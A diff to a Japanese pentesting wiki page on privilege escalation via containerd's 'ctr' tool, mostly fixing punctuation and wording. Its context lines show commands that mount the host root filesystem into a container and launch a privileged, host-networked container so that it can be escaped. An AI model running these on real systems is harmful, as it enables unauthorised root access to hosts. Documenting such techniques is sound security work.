@@ -4,7 +4,8 @@
 
 ## 基本情報
 
-**containerd** と `ctr` について学ぶには、以下のリンクにアクセスしてください：
+**containerd** と `ctr` について学ぶには、以下のリンクにアクセスしてください:
+
 
 {{#ref}}
 ../../network-services-pentesting/2375-pentesting-docker.md
@@ -12,7 +13,7 @@
 
 ## PE 1
 
-ホストに `ctr` コマンドが含まれていることがわかった場合：
+ホストに `ctr` コマンドが含まれていることがわかった場合:
 ```bash
 which ctr
 /usr/bin/ctr
@@ -35,7 +36,7 @@ ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:late
 ```bash
 ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
 ```
-次に、**特権機能を悪用してそれから脱出する**ために、以下のページに記載されているいくつかの技術を使用できます：
+次に、**特権機能を悪用してそこから脱出する**ために、以下のページに記載されているいくつかの技術を使用できます：
 
 {{#ref}}
 docker-security/
